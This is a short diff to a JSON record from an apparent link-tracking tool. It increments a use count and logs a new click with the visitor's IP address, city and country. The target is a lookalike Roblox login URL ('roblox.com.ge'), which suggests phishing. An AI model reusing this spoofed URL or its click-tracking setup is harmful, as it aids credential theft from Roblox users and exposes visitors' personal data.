@@ -4,7 +4,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776493139088,
     "status": "active",
-    "useCount": 4,
+    "useCount": 5,
     "createdBy": "system",
     "clicks": [
       {
@@ -38,6 +38,14 @@
         "city": "Dau",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1776592501408,
+        "ip": "104.232.221.55",
+        "country": "Belgium",
+        "city": "Antwerp",
+        "flag": "🇧🇪",
+        "countryCode": "BE"
       }
     ]
   },
